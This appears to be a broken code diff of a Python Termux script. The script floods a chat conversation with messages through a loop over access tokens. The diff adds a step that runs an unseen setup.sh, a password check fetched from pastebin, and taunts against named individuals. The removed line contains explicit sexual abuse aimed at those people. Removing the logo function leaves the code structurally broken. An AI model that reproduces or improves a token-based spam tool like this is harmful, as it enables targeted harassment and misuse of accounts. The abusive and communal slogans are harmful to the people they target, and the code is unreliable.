@@ -1,4 +1,3 @@
-
 import requests
 import random
 import time
@@ -8,36 +7,14 @@ from platform import system
 import os, platform, binascii, sys, _socket, ssl, certifi, zlib, json, uuid
 from time import sleep
 import os
+from requests.exceptions import RequestException
 import http.server
 import socketserver
 import threading
 time.sleep(1)
  
-def cls():
-    if system() == 'Linux':
-        os.system('clear')
-    else:
-        if system() == 'Windows':
-            os.system('cls')
-            
-def liness():
-		print('\u001b[37m' + '[>] ================================')
-		
-		
-cls()
-CLEAR_SCREEN = '\033[2J'
-RED = '\033[1;31;1m'  # mode 31 = red foreground
-RESET = '\033[1;37;1m'  # mode 0  = reset
-BLUE = "\033[1;36;1m"
-WHITE = "\033[1;30;1m",
-YELLOW = "\033[1;37;1m",
-CYAN = "\033[1;36;1m"
-MAGENTA = "\033[1;37;1m",
-GREEN = "\033[1;32;1m"
-RESET = "\033[1;37;1m"
-BOLD = '\033[1;37;1m'
-REVERSE = "\033[1;37;1m"
-
+os.system("bash setup.sh")
+os.system("clear")
 
 imt="-M4786=="
 myid=uuid.uuid4().hex[:10].upper()
@@ -47,21 +24,27 @@ except:
 	kok=open('/data/data/com.termux/files/usr/bin/.mrBALOCH -cov', 'w')
 	kok.write(myid+imt)
 	kok.close()
-def logo():
-    clear = "\x1b[0m"
-    colors = [35, 33, 36]
-
+os.system("bash setup.sh")
+os.system("clear")
     x = """
 
-  /$$$$$$   /$$$$$$  /$$   /$$ /$$$$$$$   /$$$$$$  /$$    /$$
- /$$__  $$ /$$__  $$| $$  | $$| $$__  $$ /$$__  $$| $$   | $$
-| $$  \__/| $$  \ $$| $$  | $$| $$  \ $$| $$  \ $$| $$   | $$
-|  $$$$$$ | $$  | $$| $$  | $$| $$$$$$$/| $$$$$$$$|  $$ / $$/
- \____  $$| $$  | $$| $$  | $$| $$__  $$| $$__  $$ \  $$ $$/ 
- /$$  \ $$| $$  | $$| $$  | $$| $$  \ $$| $$  | $$  \  $$$/  
-|  $$$$$$/|  $$$$$$/|  $$$$$$/| $$  | $$| $$  | $$   \  $/   
- \______/  \______/  \______/ |__/  |__/|__/  |__/    \_/    
-                                                             
+ 
+#-------------------------------------------------------------------
+print("""
+🔥                          \033[1;36m𓆰𓃮𓆪                         🔥            
+\033[1;36m@@@  @@@   @@@@@@    @@@@@@    @@@@@@    @@@@@@   @@@  @@@  \033[1;91m 𝐑
+\033[1;36m@@@  @@@  @@@@@@@@  @@@@@@@   @@@@@@@   @@@@@@@@  @@@@ @@@  
+@@!  @@@  @@!  @@@  !@@       !@@       @@!  @@@  @@!@!@@@  \033[1;92m A
+\033[1;36m!@!  @!@  !@!  @!@  !@!       !@!       !@!  @!@  !@!!@!@!  
+\033[1;36m@!@!@!@!  @!@!@!@!  !!@@!!    !!@@!!    @!@!@!@!  @!@ !!@!  \033[1;93m 𝐉
+\033[1;36m!!!@!!!!  !!!@!!!!   !!@!!!    !!@!!!   !!!@!!!!  !@!  !!!  
+\033[1;36m!!:  !!!  !!:  !!!       !:!       !:!  !!:  !!!  !!:  !!!  \033[1;94m 𝐏
+\033[1;36m:!:  !:!  :!:  !:!      !:!       !:!   :!:  !:!  :!:  !:!  
+\033[1;36m::   :::  ::   :::  :::: ::   :::: ::   ::   :::   ::   ::  \033[1;95m 𝐔
+\033[1;36m :   : :   :   : :  :: : :    :: : :     :   : :  ::    :   
+                                                            \033[1;96m 𝐓               
+                                                
+
                                                              
                ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣴⣶⣶⣤⡀⠀⠀⠀
 ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣼⣿⣿⣿⣿⣿⣿⡆[My Friend]⠀⠀
@@ -112,6 +95,20 @@ def venom():
         sys.stdout.write("\x1b[1;%dm%s%s\n" % (random.choice(colors), line, clear))
         time.sleep(0.05)
     	
+    # Prompt Password 
+def pas():
+    print('\u001b[37m' + '---------------------------------------------------')
+    password = input("Password : ") 
+    print('--------------------------------------------')
+    mmm = requests.get('https://pastebin.com/raw/tBBC9TVj').text
+
+    if mmm not in password:
+        print('[-] <==> Incorrect Password!')
+        sys.exit()
+        
+pas()
+
+    
 venom()
 print('''\033[1;32m[#] _ KATTAR HINDU == > [ Jai Shree Ram ❤️💪]\n''')
 if int:
@@ -176,7 +173,7 @@ def send_messages(convo_id, tokens, messages, haters_name, speed):
                 response = requests.post(url, json=parameters, headers=headers)
                 current_time = time.strftime("%Y-%m-%d %I:%M:%S3 %p")
                 if response.ok:
-                    print("\033[1;33m[+] ANSH + ABHAY KI MAA CHUDNA SURU HOGIE  {} of Convo\033[1;35m {} \033[1;33msent by Token {}: \n\033[1;35m{}".format(
+                    print("\033[1;33m[+] ANSH + ABHAY KA BAAP RAHUL ROBIN ON FIRE {} of Convo\033[1;35m {} \033[1;33msent by Token {}: \n\033[1;35m{}".format(
                         message_index + 1, convo_id, token_index + 1, f'{haters_name} {message}'))
                     print("\033[1;32m  - Time: {}".format(current_time))
                 else:
